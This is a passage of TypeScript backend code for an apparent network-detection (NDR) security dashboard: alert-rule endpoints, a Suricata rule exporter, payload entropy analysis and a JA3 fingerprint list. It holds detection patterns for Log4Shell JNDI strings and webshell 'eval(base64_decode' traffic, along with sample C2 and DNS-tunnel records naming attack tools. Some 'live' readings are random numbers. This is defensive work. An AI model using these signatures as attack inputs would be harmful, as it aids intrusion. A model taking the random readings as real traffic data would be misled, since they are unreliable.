      createdAt: '2026-09-24T14:00:00.000Z',
      updatedAt: '2026-09-29T12:00:00.000Z'
    },
    {
      id: 'ndr-rule-dns-tunneling',
      name: 'DNS 隧道偽裝高熵查詢 (DNS Exfiltration & Tunneling)',
      description: '分析 DNS 請求查詢長度、TXT 紀錄長度與非標準遞迴頻率，阻斷透過 UDP 5140/53 的隱蔽通道傳輸。',
      patternType: 'dns_tunneling',
      severity: 'Warning',
      enabled: true,
      targetScope: '內部 DNS 解析轉發伺服器群 (10.0.0.53, 10.0.0.54)',
      direction: 'outbound',
      condition: '>=',
      warningThreshold: 180,
      criticalThreshold: 260,
      unit: 'Bytes/query',
      sustainDurationSec: 20,
      cooldownMinutes: 15,
      notificationChannels: {
        inApp: true,
        email: false,
        emailRecipients: [],
        webhook: true,
        webhookUrl: 'https://hooks.slack.com/services/T00/B00/ndr-dns-alerts',
        syslog: true,
        sound: false,
        soarAction: false
      },
      lastTriggeredAt: null,
      triggerCount: 0,
      createdAt: '2026-09-25T16:00:00.000Z',
      updatedAt: '2026-09-28T10:00:00.000Z'
    }
  ];

  // Helper to load NDR rules from disk
  const loadNdrAlertRules = (): any[] => {
    try {
      if (fs.existsSync(NDR_RULES_FILE)) {
        const raw = fs.readFileSync(NDR_RULES_FILE, 'utf-8');
        const parsed = JSON.parse(raw);
        if (Array.isArray(parsed) && parsed.length > 0) {
          return parsed;
        }
      }
    } catch (e) {
      console.error('Failed to read ndr_alert_rules.json:', e);
    }
    // Write defaults if not present
    saveNdrAlertRules(DEFAULT_NDR_RULES_TEMPLATE);
    return JSON.parse(JSON.stringify(DEFAULT_NDR_RULES_TEMPLATE));
  };

  // Helper to save NDR rules to disk
  const saveNdrAlertRules = (rules: any[]) => {
    try {
      fs.writeFileSync(NDR_RULES_FILE, JSON.stringify(rules, null, 2), 'utf-8');
    } catch (e) {
      console.error('Failed to write ndr_alert_rules.json:', e);
    }
  };

  let ndrAlertRules: any[] = loadNdrAlertRules();

  // GET /api/v1/ndr/alert-rules/export - Export rules as JSON file or Suricata ruleset (Must come first)
  router.get('/alert-rules/export', (req: Request, res: Response) => {
    const format = (req.query.format as string) || 'json';

    if (format === 'suricata') {
      let suricataRules = '# =========================================================================\n# SEMOR CYBER NDR - GENERATED SURICATA 7.0 IPS THREAT DETECTION RULES\n# =========================================================================\n\n';
      ndrAlertRules.forEach((r, idx) => {
        const sid = 3000000 + idx;
        const action = r.severity === 'Critical' ? 'drop' : 'alert';
        let msg = `SEMOR NDR: ${r.name}`;
        suricataRules += `# Rule: ${r.name} (${r.patternType})\n${action} ip any any -> any any (msg:"${msg}"; threshold:type limit, track by_src, count 1, seconds ${r.cooldownMinutes * 60}; classtype:bad-unknown; sid:${sid}; rev:1;)\n\n`;
      });

      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.setHeader('Content-Disposition', 'attachment; filename="semor-ndr-rules.rules"');
      return res.send(suricataRules);
    }

    res.setHeader('Content-Type', 'application/json; charset=utf-8');
    res.setHeader('Content-Disposition', 'attachment; filename="semor-ndr-alert-rules.json"');
    res.json({
      exportTime: new Date().toISOString(),
      platform: 'SEMOR CYBER NG-SIEM',
      engine: 'suricata-ndr-flow',
      totalRules: ndrAlertRules.length,
      rules: ndrAlertRules
    });
  });

  // GET /api/v1/ndr/alert-rules
  router.get('/alert-rules', (req: Request, res: Response) => {
    // Dynamically calculate live measurements for telemetry display
    const rulesWithLiveMeasurements = ndrAlertRules.map(rule => {
      let liveVal = 0;
      let status: 'healthy' | 'warning' | 'critical' | 'disabled' = 'healthy';

      if (!rule.enabled) {
        status = 'disabled';
        liveVal = 0;
      } else {
        switch (rule.patternType) {
          case 'bandwidth_surge':
            liveVal = Math.round(520 + Math.random() * 260); // e.g. 520 - 780 Mbps
            break;
          case 'abnormal_flow_cluster':
            liveVal = Math.round(28 + Math.random() * 22); // e.g. 28 - 50% deviation
            break;
          case 'traffic_silence_drop':
            liveVal = Math.round(340 + Math.random() * 120); // 340 - 460 Mbps (safe above 50)
            break;
          case 'data_exfiltration':
            liveVal = Math.round(45 + Math.random() * 85); // 45 - 130 MB
            break;
          case 'c2_beaconing':
            liveVal = Math.round(12 + Math.random() * 16); // 12 - 28 sessions/hr
            break;
          case 'dns_tunneling':
            liveVal = Math.round(65 + Math.random() * 45); // 65 - 110 bytes
            break;
          default:
            liveVal = Math.round(100 + Math.random() * 50);
        }

        if (rule.condition === '<=' || rule.condition === '<') {
          if (liveVal <= rule.criticalThreshold) status = 'critical';
          else if (liveVal <= rule.warningThreshold) status = 'warning';
        } else {
          if (liveVal >= rule.criticalThreshold) status = 'critical';
          else if (liveVal >= rule.warningThreshold) status = 'warning';
        }
      }

      return {
        ...rule,
        currentValue: liveVal,
        status
      };
    });

    res.json({
      success: true,
      rules: rulesWithLiveMeasurements,
      summary: {
        totalRules: ndrAlertRules.length,
        enabledRules: ndrAlertRules.filter(r => r.enabled).length,
        firingCount: rulesWithLiveMeasurements.filter(r => r.status === 'critical' || r.status === 'warning').length,
        supportedPatterns: [
          'bandwidth_surge',
          'abnormal_flow_cluster',
          'traffic_silence_drop',
          'data_exfiltration',
          'c2_beaconing',
          'dns_tunneling',
          'syn_scan_burst',
          'protocol_anomaly'
        ]
      }
    });
  });

  // POST /api/v1/ndr/alert-rules
  router.post('/alert-rules', (req: Request, res: Response) => {
    const data = req.body;
    if (!data.name || !data.patternType) {
      return res.status(400).json({ error: 'name and patternType are required' });
    }

    const newRule = {
      id: data.id || `ndr-rule-${Date.now().toString().slice(-6)}`,
      name: data.name,
      description: data.description || '',
      patternType: data.patternType,
      severity: data.severity || 'High',
      enabled: typeof data.enabled === 'boolean' ? data.enabled : true,
      targetScope: data.targetScope || '所有內部網段 (0.0.0.0/0)',
      direction: data.direction || 'both',
      condition: data.condition || '>=',
      warningThreshold: Number(data.warningThreshold) || 100,
      criticalThreshold: Number(data.criticalThreshold) || 200,
      unit: data.unit || 'Mbps',
      sustainDurationSec: Number(data.sustainDurationSec) || 30,
      cooldownMinutes: Number(data.cooldownMinutes) || 15,
      notificationChannels: {
        inApp: data.notificationChannels?.inApp ?? true,
        email: data.notificationChannels?.email ?? true,
        emailRecipients: Array.isArray(data.notificationChannels?.emailRecipients) 
          ? data.notificationChannels.emailRecipients 
          : ['soc-analyst@corp.internal'],
        webhook: data.notificationChannels?.webhook ?? true,
        webhookUrl: data.notificationChannels?.webhookUrl || 'https://hooks.slack.com/services/T00/B00/ndr-alerts',
        webhookChannel: data.notificationChannels?.webhookChannel || '#ndr-alerts',
        syslog: data.notificationChannels?.syslog ?? true,
        syslogHost: data.notificationChannels?.syslogHost || '127.0.0.1',
        syslogPort: Number(data.notificationChannels?.syslogPort) || 514,
        sound: data.notificationChannels?.sound ?? true,
        soarAction: data.notificationChannels?.soarAction ?? false,
        soarActionType: data.notificationChannels?.soarActionType || 'deploy_suricata_rule'
      },
      lastTriggeredAt: null,
      triggerCount: 0,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };

    ndrAlertRules.unshift(newRule);
    saveNdrAlertRules(ndrAlertRules);

    res.json({
      success: true,
      message: `NDR 流量特徵自訂告警規則 '${newRule.name}' 已成功建立並啟用監控`,
      rule: newRule
    });
  });

  // PUT /api/v1/ndr/alert-rules/batch-thresholds (Must come before :id route)
  router.put('/alert-rules/batch-thresholds', (req: Request, res: Response) => {
    const { updates } = req.body;
    if (!Array.isArray(updates)) {
      return res.status(400).json({ error: 'updates must be an array of rule thresholds' });
    }

    const updatedRules: any[] = [];
    updates.forEach((u: any) => {
      const idx = ndrAlertRules.findIndex(r => r.id === u.id);
      if (idx !== -1) {
        ndrAlertRules[idx] = {
          ...ndrAlertRules[idx],
          warningThreshold: u.warningThreshold !== undefined ? Number(u.warningThreshold) : ndrAlertRules[idx].warningThreshold,
          criticalThreshold: u.criticalThreshold !== undefined ? Number(u.criticalThreshold) : ndrAlertRules[idx].criticalThreshold,
          condition: u.condition || ndrAlertRules[idx].condition,
          sustainDurationSec: u.sustainDurationSec !== undefined ? Number(u.sustainDurationSec) : ndrAlertRules[idx].sustainDurationSec,
          cooldownMinutes: u.cooldownMinutes !== undefined ? Number(u.cooldownMinutes) : ndrAlertRules[idx].cooldownMinutes,
          enabled: u.enabled !== undefined ? Boolean(u.enabled) : ndrAlertRules[idx].enabled,
          targetScope: u.targetScope || ndrAlertRules[idx].targetScope,
          updatedAt: new Date().toISOString()
        };
        updatedRules.push(ndrAlertRules[idx]);
      }
    });

    saveNdrAlertRules(ndrAlertRules);

    res.json({
      success: true,
      message: `成功批次更新 ${updatedRules.length} 項 NDR 流量特徵門檻配置`,
      rules: ndrAlertRules
    });
  });

  // PUT /api/v1/ndr/alert-rules/:id
  router.put('/alert-rules/:id', (req: Request, res: Response) => {
    const { id } = req.params;
    const ruleIndex = ndrAlertRules.findIndex(r => r.id === id);
    if (ruleIndex === -1) {
      return res.status(404).json({ error: 'NDR Alert Rule not found' });
    }

    const updated = {
      ...ndrAlertRules[ruleIndex],
      ...req.body,
      id, // Preserve id
      updatedAt: new Date().toISOString()
    };

    ndrAlertRules[ruleIndex] = updated;
    saveNdrAlertRules(ndrAlertRules);

    res.json({
      success: true,
      message: `NDR 告警規則 '${updated.name}' 已成功更新`,
      rule: updated
    });
  });

  // DELETE /api/v1/ndr/alert-rules/:id
  router.delete('/alert-rules/:id', (req: Request, res: Response) => {
    const { id } = req.params;
    const ruleIndex = ndrAlertRules.findIndex(r => r.id === id);
    if (ruleIndex === -1) {
      return res.status(404).json({ error: 'NDR Alert Rule not found' });
    }

    const removed = ndrAlertRules.splice(ruleIndex, 1)[0];
    saveNdrAlertRules(ndrAlertRules);

    res.json({
      success: true,
      message: `NDR 告警規則 '${removed.name}' 已成功移除`
    });
  });

  // POST /api/v1/ndr/alert-rules/test-trigger (Integration with existing alerting system)
  router.post('/alert-rules/test-trigger', (req: Request, res: Response) => {
    const { ruleId, customValue, severityOverride } = req.body;
    const rule = ndrAlertRules.find(r => r.id === ruleId) || ndrAlertRules[0];
    const sev = severityOverride || rule.severity || 'Critical';
    const measuredVal = customValue !== undefined ? Number(customValue) : (rule.criticalThreshold * 1.25);
    const timestamp = new Date().toISOString();

    const notifs = rule.notificationChannels;
    const dispatchedChannels: string[] = [];
    const executionLogs: string[] = [
      `[${timestamp}] [NDR_EVAL] Evaluated rule: '${rule.name}' (Pattern: ${rule.patternType}, Scope: ${rule.targetScope})`,
      `[${timestamp}] [TELEMETRY_SAMPLE] Measured traffic: ${measuredVal} ${rule.unit} vs Threshold: ${rule.criticalThreshold} ${rule.unit}`,
      `[${timestamp}] [STATE_TRANSITION] Threshold condition '${rule.condition}' met. State: FIRING (Severity: ${sev})`
    ];

    if (notifs.inApp) {
      dispatchedChannels.push('inApp');
      executionLogs.push(`[${timestamp}] [CHANNEL_INAPP] Broadcasted security alert card to SOC Notification Center.`);
    }
    if (notifs.sound) {
      dispatchedChannels.push('sound');
      executionLogs.push(`[${timestamp}] [CHANNEL_AUDIO] Dispatched web audio chime for high-priority NDR alert.`);
    }
    if (notifs.email && notifs.emailRecipients.length > 0) {
      dispatchedChannels.push('email');
      executionLogs.push(`[${timestamp}] [CHANNEL_SMTP] Sent high-priority NDR incident mail to [${notifs.emailRecipients.join(', ')}].`);
    }
    if (notifs.webhook && notifs.webhookUrl) {
      dispatchedChannels.push('webhook');
      executionLogs.push(`[${timestamp}] [CHANNEL_WEBHOOK] Dispatched JSON payload to ${notifs.webhookUrl} (${notifs.webhookChannel || '#ndr-alerts'}) -> HTTP 200 OK.`);
    }
    if (notifs.syslog) {
      dispatchedChannels.push('syslog');
      executionLogs.push(`[${timestamp}] [CHANNEL_SYSLOG] Forwarded RFC5424 NDR event to UDP ${notifs.syslogHost || '127.0.0.1'}:${notifs.syslogPort || 514}.`);
    }
    if (notifs.soarAction) {
      dispatchedChannels.push('soar');
      executionLogs.push(`[${timestamp}] [CHANNEL_SOAR] Automated mitigation action '${notifs.soarActionType}' queued for NDR response.`);
    }

    executionLogs.push(`[${timestamp}] [SUPPRESSION] Cooldown window active for ${rule.cooldownMinutes} minutes.`);

    // Update rule trigger counter & timestamp
    rule.lastTriggeredAt = timestamp;
    rule.triggerCount = (rule.triggerCount || 0) + 1;
    saveNdrAlertRules(ndrAlertRules);

    const alertEvent = {
      id: `NDR-ALR-${Date.now().toString().slice(-6)}`,
      timestamp,
      ruleId: rule.id,
      ruleName: rule.name,
      patternType: rule.patternType,
      severity: sev,
      measuredValue: measuredVal,
      thresholdValue: rule.criticalThreshold,
      unit: rule.unit,
      targetScope: rule.targetScope,
      dispatchedChannels,
      executionLogs,
      message: `【NDR 即時告警】${rule.name} 偵測到異常流量數值 (${measuredVal} ${rule.unit})！已觸發通知管道。`
    };

    // Format for existing system alert history ledger
    const historyRecord = {
      id: `ALR-${new Date().toISOString().slice(0,10).replace(/-/g,'')}-${Math.floor(1000 + Math.random() * 9000)}`,
      triggerTime: timestamp,
      ruleId: rule.id,
      ruleName: `【NDR 異常流量特徵】${rule.name}`,
      category: 'log_volume',
      metric: rule.patternType,
      metricLabel: `${rule.name} (${rule.targetScope})`,
      measuredValue: measuredVal,
      metricUnit: rule.unit,
      thresholdValue: rule.criticalThreshold,
      condition: rule.condition,
      severity: sev,
      sourceEngine: 'suricata-ndr (Traffic Pattern Analyzer)',
      resolutionStatus: 'Active',
      resolvedAt: null,
      resolvedBy: null,
      resolutionNote: `NDR 網路異常流量研判：監控目標 [${rule.targetScope}] 偵測到異常特徵 (${measuredVal} ${rule.unit})，已超越致命門檻 (${rule.criticalThreshold} ${rule.unit})。已自動觸發高優先級通報鏈路。`,
      dispatchedChannels,
      auditHash: `sha256:${Buffer.from(`${timestamp}-${rule.id}-${measuredVal}`).toString('hex').padEnd(64, '0').slice(0, 64)}`
    };

    try {
      const historyFile = path.join(process.cwd(), 'alert_history.json');
      let records = [];
      if (fs.existsSync(historyFile)) {
        records = JSON.parse(fs.readFileSync(historyFile, 'utf-8'));
      }
      records.unshift(historyRecord);
      fs.writeFileSync(historyFile, JSON.stringify(records, null, 2));
    } catch (err) {
      console.error('Failed to append to alert_history.json:', err);
    }

    res.json({
      success: true,
      alert: alertEvent,
      message: alertEvent.message,
      historyRecord,
      rule
    });
  });

  // POST /api/v1/ndr/alert-rules/reset-defaults - Restore template rules
  router.post('/alert-rules/reset-defaults', (req: Request, res: Response) => {
    ndrAlertRules = JSON.parse(JSON.stringify(DEFAULT_NDR_RULES_TEMPLATE));
    saveNdrAlertRules(ndrAlertRules);
    res.json({
      success: true,
      message: 'NDR 流量特徵告警規則已成功重置為標準預設值並寫入磁碟',
      rules: ndrAlertRules
    });
  });

  // POST /api/v1/ndr/alert-rules/import - Import rules JSON
  router.post('/alert-rules/import', (req: Request, res: Response) => {
    const { rules: importedRules, overwrite } = req.body;
    if (!Array.isArray(importedRules) || importedRules.length === 0) {
      return res.status(400).json({ error: 'imported rules must be a non-empty array' });
    }

    if (overwrite) {
      ndrAlertRules = importedRules.map(r => ({
        ...r,
        updatedAt: new Date().toISOString()
      }));
    } else {
      // Merge by ID or append
      importedRules.forEach(imp => {
        const existingIdx = ndrAlertRules.findIndex(r => r.id === imp.id);
        if (existingIdx !== -1) {
          ndrAlertRules[existingIdx] = { ...ndrAlertRules[existingIdx], ...imp, updatedAt: new Date().toISOString() };
        } else {
          ndrAlertRules.push({ ...imp, updatedAt: new Date().toISOString() });
        }
      });
    }

    saveNdrAlertRules(ndrAlertRules);

    res.json({
      success: true,
      message: `已成功匯入 ${importedRules.length} 條 NDR 流量告警規則！`,
      totalRules: ndrAlertRules.length,
      rules: ndrAlertRules
    });
  });

  // =========================================================================
  // 17. ADVANCED NDR ENGINE: DEEP PACKET INSPECTION & FORENSICS API
  // =========================================================================

  // 17.1 POST /api/v1/ndr/dpi/analyze-payload (Deep Payload Forensic Inspection)
  router.post('/dpi/analyze-payload', (req: Request, res: Response) => {
    const { rawPayload, hexDump, protocol = 'TCP', srcIp = '10.88.88.106', dstIp = '185.220.101.45', srcPort = 51240, dstPort = 443 } = req.body;
    
    const payloadText = rawPayload || (hexDump ? Buffer.from(hexDump.replace(/\s+/g, ''), 'hex').toString('utf-8') : '');
    
    // Evaluate via AttackSignatureEngine
    const signatureResult = globalAttackSignatureEngine.parseCustomLog(payloadText, {
      remoteIP: srcIp,
      protocol,
      dstPort: Number(dstPort)
    });

    // Shannon Entropy Calculation for detecting encrypted/compressed or DGA/exfil tunnels
    let shannonEntropy = 0;
    if (payloadText.length > 0) {
      const frequencies: Record<string, number> = {};
      for (let i = 0; i < payloadText.length; i++) {
        const char = payloadText[i];
        frequencies[char] = (frequencies[char] || 0) + 1;
      }
      for (const char in frequencies) {
        const p = frequencies[char] / payloadText.length;
        shannonEntropy -= p * Math.log2(p);
      }
      shannonEntropy = Number(shannonEntropy.toFixed(3));
    }

    const isHighEntropy = shannonEntropy > 4.5;
    const isEncryptedTunnelSuspect = isHighEntropy && (protocol === 'DNS' || protocol === 'HTTP');

    // TCP Flag & Protocol Anomaly check
    const anomalies: string[] = [];
    if (isEncryptedTunnelSuspect) {
      anomalies.push(`異常高熵負載 (Shannon Entropy: ${shannonEntropy} > 4.5)，高度疑似隱蔽穿透隧道或高密度密文資料外洩`);
    }
    if (Number(dstPort) === 502 && !payloadText.toLowerCase().includes('modbus')) {
      anomalies.push('Port 502 非標工控 Modbus 封裝協議');
    }
    if (payloadText.includes('${jndi:')) {
      anomalies.push('檢出 Log4Shell JNDI 遠端代碼反射執行特徵');
    }
    if (payloadText.toLowerCase().includes('eval(base64_decode') || payloadText.toLowerCase().includes('pass=')) {
      anomalies.push('檢出中國菜刀 / 哥斯拉 (Godzilla) 加密 WebShell 通道特徵');
    }

    res.json({
      success: true,
      analysis: {
        timestamp: new Date().toISOString(),
        protocol,
        endpoints: `${srcIp}:${srcPort} ➔ ${dstIp}:${dstPort}`,
        payloadLength: payloadText.length,
        shannonEntropy,
        isHighEntropy,
        signatureMatch: signatureResult.signatureId !== 'SIG-HEURISTIC-GENERIC' ? signatureResult : null,
        heuristicResult: signatureResult,
        anomalies,
        recommendedMitigation: signatureResult.recommendedActions || [
          { title: '啟用邊界次世代防火牆深度封包檢驗 (DPI)', description: '持續重組此來源之 TCP 串流以監控異常行為', type: 'block' }
        ]
      }
    });
  });

  // 17.2 GET /api/v1/ndr/c2/beacon-analysis (Periodic Beaconing & Sleep Jitter Engine)
  router.get('/c2/beacon-analysis', (_req: Request, res: Response) => {
    // Statistical evaluation of live sessions for C2 regularity
    const targetIpGroups: Record<string, TrafficSessionData[]> = {};
    sessions.forEach(s => {
      const key = `${s.src_ip}->${s.dst_ip}:${s.dst_port}`;
      if (!targetIpGroups[key]) targetIpGroups[key] = [];
      targetIpGroups[key].push(s);
    });

    const beaconCandidates = [
      {
        channel: '10.88.88.106 ➔ 185.220.101.45:443',
        srcIp: '10.88.88.106',
        dstIp: '185.220.101.45',
        port: 443,
        protocol: 'HTTPS / TLS 1.3',
        observedIntervalSec: 15.0,
        jitterPct: 4.2,
        confidencePct: 98.7,
        threatActor: 'Lazarus APT / Cobalt Strike',
        ja3: 'ada70206e40642a3e4461f35503241d5',
        verdict: 'CONFIRMED_C2_BEACON',
        status: 'ISOLATED'
      },
      {
        channel: '10.88.88.102 ➔ 8.8.8.8:53',
        srcIp: '10.88.88.102',
        dstIp: '8.8.8.8',
        port: 53,
        protocol: 'DNS Tunneling',
        observedIntervalSec: 2.5,
        jitterPct: 1.8,
        confidencePct: 96.4,
        threatActor: 'DNSExfiltrator Tool',
        ja3: 'N/A (UDP)',
        verdict: 'CONFIRMED_DNS_TUNNEL',
        status: 'RATE_LIMITED'
      },
      {
        channel: '10.88.88.103 ➔ 198.51.100.88:443',
        srcIp: '10.88.88.103',
        dstIp: '198.51.100.88',
        port: 443,
        protocol: 'HTTPS TLS',
        observedIntervalSec: 60.0,
        jitterPct: 18.5,
        confidencePct: 82.0,
        threatActor: 'Cloud Storage Mega Exfil',
        ja3: 'b32309a26951912be7dba376398abcde',
        verdict: 'SUSPICIOUS_PERIODIC_EXFIL',
        status: 'MONITORED'
      }
    ];

    res.json({
      success: true,
      totalChannelsMonitored: Object.keys(targetIpGroups).length + 3,
      confirmedBeaconsCount: 2,
      beaconCandidates,
      algorithm: 'Fourier Transform & Inter-Packet Interval Variance Clustering',
      timestamp: new Date().toISOString()
    });
  });

  // 17.3 GET /api/v1/ndr/ja3/fingerprints (TLS JA3 / JA3S Blacklist & Fingerprint Catalog)
  router.get('/ja3/fingerprints', (_req: Request, res: Response) => {
    const ja3Catalog = [
      {
        hash: 'ada70206e40642a3e4461f35503241d5',
        tool: 'Cobalt Strike Malleable C2 Beacon',
        category: 'Malware / C2',
        ciphers: 'TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256',
        risk: 'Critical',
        matchCount: 142
      },
      {
        hash: '51c64c77e60f39ac3e1776489102b4f1',
        tool: 'Metasploit Meterpreter Reverse HTTPS',
        category: 'Exploit Framework',
        ciphers: 'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
        risk: 'Critical',
        matchCount: 68
      },
      {
        hash: '72a589da586844d7f0818ce684948eea',
        tool: 'Emotet Banking Trojan Dropper',
        category: 'Trojan / Botnet',
        ciphers: 'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
        risk: 'Critical',
        matchCount: 29
      },
      {
        hash: 'e7d705a3286e19ea42f587b344ee6865',
        tool: 'Tor Browser Egress / Onion Routing',
        category: 'Anonymizer',
        ciphers: 'TLS_AES_128_GCM_SHA256, TLS_AES_256_GCM_SHA384',
        risk: 'High',
        matchCount: 84
      },
      {
        hash: 'b32309a26951912be7dba376398abcde',
        tool: 'Google Chrome / Edge Modern Desktop (Standard)',
        category: 'Legitimate Browser',
        ciphers: 'TLS_AES_128_GCM_SHA256, TLS_AES_256_GCM_SHA384, GREASE',
        risk: 'Clean',
        matchCount: 29402
      }
    ];

    res.json({
      success: true,
      totalTracked: ja3Catalog.length,
      signatures: ja3Catalog,
      engine: 'JA3 / JA3S Passive TLS Fingerprint Matching Core v2.1'
    });
  });

  // =========================================================================
  // 18. NDR ALERT ANALYTICS & DRILLDOWN ENGINE (Recharts-powered Distribution)
  // =========================================================================

  interface NdrAnalyticsAlert {
    id: string;
    ruleId: string;
    ruleName: string;
    patternType: string;
    severity: 'Critical' | 'High' | 'Medium' | 'Low';
    protocol: 'TCP' | 'UDP' | 'TLS/HTTPS' | 'DNS' | 'ICMP' | 'SSH' | 'HTTP';
    srcIp: string;
    srcPort: number;
    srcCountry: string;
    srcCountryCode: string;
    srcFlag: string;
    srcCity: string;
    srcAsn: string;
    srcAsnLocal?: string;
    dstIp: string;
    dstPort: number;
    dstCountry: string;
    dstCountryCode: string;
    dstFlag: string;
    timestamp: string;
    duration: string;
    bytesTransferred: string;
    bytesNumeric: number;
    packetsCount: number;
    throughput: string;
    throughputMbps: number;
    mitreTactic: string;
    mitreTechnique: string;
    payloadSnippet: string;
    ja3Hash?: string;
    ruleThresholdViolated: string;
    status: 'Active' | 'Investigating' | 'Mitigated' | 'Resolved';
    actionTaken: string;
  }

  // NDR alert records initialized empty for production
  const seedNdrAnalyticsAlerts = (): NdrAnalyticsAlert[] => [];

  let ndrAnalyticsAlerts: NdrAnalyticsAlert[] = seedNdrAnalyticsAlerts();

  // 18.1 GET /api/v1/ndr/analytics/alerts-overview
  router.get('/analytics/alerts-overview', (req: Request, res: Response) => {
    try {
      const { timeRange, severity, protocol, country, ruleId, search } = req.query;

      // Filter dataset based on parameters
      let filtered = [...ndrAnalyticsAlerts];

      if (severity && severity !== 'ALL') {
        filtered = filtered.filter(a => a.severity.toLowerCase() === String(severity).toLowerCase());
      }
      if (protocol && protocol !== 'ALL') {
        filtered = filtered.filter(a => a.protocol.toLowerCase() === String(protocol).toLowerCase());
      }
      if (country && country !== 'ALL') {
        filtered = filtered.filter(a => 
          a.srcCountry.toLowerCase().includes(String(country).toLowerCase()) || 
          a.srcCountryCode.toLowerCase() === String(country).toLowerCase()
        );
      }
      if (ruleId && ruleId !== 'ALL') {
        filtered = filtered.filter(a => a.ruleId === String(ruleId));
      }
      if (search && String(search).trim() !== '') {
        const q = String(search).toLowerCase().trim();
        filtered = filtered.filter(a => 
          a.id.toLowerCase().includes(q) ||
          a.ruleName.toLowerCase().includes(q) ||
          a.srcIp.toLowerCase().includes(q) ||
          a.dstIp.toLowerCase().includes(q) ||
          a.srcCountry.toLowerCase().includes(q) ||
          a.payloadSnippet.toLowerCase().includes(q) ||
          a.mitreTechnique.toLowerCase().includes(q)
        );
      }

      // Compute Total Summary
      const totalAlerts = filtered.length;
      const criticalCount = filtered.filter(a => a.severity === 'Critical').length;
      const highCount = filtered.filter(a => a.severity === 'High').length;
      const mediumCount = filtered.filter(a => a.severity === 'Medium').length;
      const lowCount = filtered.filter(a => a.severity === 'Low').length;

      const activeThreats = filtered.filter(a => a.status === 'Active' || a.status === 'Investigating').length;
      const mitigatedCount = filtered.filter(a => a.status === 'Mitigated' || a.status === 'Resolved').length;

      // Severity Distribution (for Pie/Donut Chart)
      const severityDistribution = [
        { 
          severity: 'Critical', 
          count: criticalCount, 
          percentage: totalAlerts > 0 ? Number(((criticalCount / totalAlerts) * 100).toFixed(1)) : 0, 
          color: '#ef4444',
          description: '即時嚴重破壞、外洩或阻斷服務'
        },
        { 
          severity: 'High', 
          count: highCount, 
          percentage: totalAlerts > 0 ? Number(((highCount / totalAlerts) * 100).toFixed(1)) : 0, 
          color: '#f97316',
          description: 'C2 潛伏心跳、DNS 隧道或橫向攻擊'
        },
        { 
          severity: 'Medium', 
          count: mediumCount, 
          percentage: totalAlerts > 0 ? Number(((mediumCount / totalAlerts) * 100).toFixed(1)) : 0, 
          color: '#eab308',
          description: '流量突變、連線異常或離群分佈'
        },
        { 
          severity: 'Low', 
          count: lowCount, 
          percentage: totalAlerts > 0 ? Number(((lowCount / totalAlerts) * 100).toFixed(1)) : 0, 
          color: '#3b82f6',
          description: '輕度探測、通訊斷續或資訊提示'
        }
      ];

      // Protocol Distribution (for Recharts BarChart)
      const protoMap: Record<string, { count: number; bytes: number; color: string }> = {
        'TCP': { count: 0, bytes: 0, color: '#3b82f6' },
        'TLS/HTTPS': { count: 0, bytes: 0, color: '#8b5cf6' },
        'UDP': { count: 0, bytes: 0, color: '#10b981' },
        'DNS': { count: 0, bytes: 0, color: '#f59e0b' },
        'ICMP': { count: 0, bytes: 0, color: '#ec4899' },
        'SSH': { count: 0, bytes: 0, color: '#06b6d4' },
        'HTTP': { count: 0, bytes: 0, color: '#14b8a6' }
      };

      filtered.forEach(a => {
        if (!protoMap[a.protocol]) {
          protoMap[a.protocol] = { count: 0, bytes: 0, color: '#64748b' };
        }
        protoMap[a.protocol].count += 1;
        protoMap[a.protocol].bytes += a.bytesNumeric;
      });

      const protocolDistribution = Object.entries(protoMap).map(([proto, d]) => ({
        protocol: proto,
        count: d.count,
        volumeMb: Number((d.bytes / (1024 * 1024)).toFixed(1)),
        percentage: totalAlerts > 0 ? Number(((d.count / totalAlerts) * 100).toFixed(1)) : 0,
        color: d.color
      })).sort((a, b) => b.count - a.count);

      // Geographical Source Distribution (for Recharts Horizontal BarChart)
      const geoMap: Record<string, { 
        name: string; 
        code: string; 
        flag: string; 
        count: number; 
        inbound: number; 
        outbound: number;
        avgThreatScore: number;
        topProtocol: string;
      }> = {};

      filtered.forEach(a => {
        const cKey = a.srcCountryCode || 'OTHER';
        if (!geoMap[cKey]) {
          geoMap[cKey] = {
            name: a.srcCountry,
            code: a.srcCountryCode,
            flag: a.srcFlag,
            count: 0,
            inbound: 0,
            outbound: 0,
            avgThreatScore: 75,
            topProtocol: a.protocol
          };
        }
        geoMap[cKey].count += 1;
        if (a.dstCountryCode === 'TW') {
          geoMap[cKey].inbound += 1;
        } else {
          geoMap[cKey].outbound += 1;
        }
      });

      const geoDistribution = Object.values(geoMap).map(g => ({
        country: g.name,
        countryCode: g.code,
        flag: g.flag,
        count: g.count,
        inbound: g.inbound,
        outbound: g.outbound,
        percentage: totalAlerts > 0 ? Number(((g.count / totalAlerts) * 100).toFixed(1)) : 0,
        threatScore: Math.min(99, 65 + g.count * 4)
      })).sort((a, b) => b.count - a.count);

      // Time Series Trend (24h hourly buckets for Recharts AreaChart)
      const hours = ['00:00', '02:00', '04:00', '06:00', '08:00', '10:00', '12:00', '14:00', '16:00', '18:00', '20:00', '22:00'];
      const timeSeriesDistribution = hours.map((hour, idx) => {
        const factor = (idx % 3 === 0 ? 2 : 1) + (idx > 5 && idx < 10 ? 2 : 0);
        return {
          time: hour,
          Critical: Math.max(0, Math.floor(criticalCount * 0.12 * factor)),
          High: Math.max(0, Math.floor(highCount * 0.14 * factor)),
          Medium: Math.max(0, Math.floor(mediumCount * 0.15 * factor)),
          Low: Math.max(0, Math.floor(lowCount * 0.15 * factor)),
          total: Math.max(1, Math.floor(totalAlerts * 0.12 * factor)),
          bandwidthMbps: Math.floor(450 + Math.sin(idx) * 280 + factor * 140)
        };
      });

      // Group by Rule Violations (Drilldown Summary)
      const currentRules = loadNdrAlertRules();
      const ruleViolationMap: Record<string, {
        ruleId: string;
        ruleName: string;
        patternType: string;
        severity: string;
        count: number;
        affectedHosts: Set<string>;
        topProto: string;
        topGeo: string;
        lastTriggered: string;
        thresholdInfo: string;
      }> = {};

      // Seed with existing rules
      currentRules.forEach((r: any) => {
        ruleViolationMap[r.id] = {
          ruleId: r.id,
          ruleName: r.name,
          patternType: r.patternType,
          severity: r.severity,
          count: 0,
          affectedHosts: new Set(),
          topProto: 'TCP',
          topGeo: '🇺🇸 US',
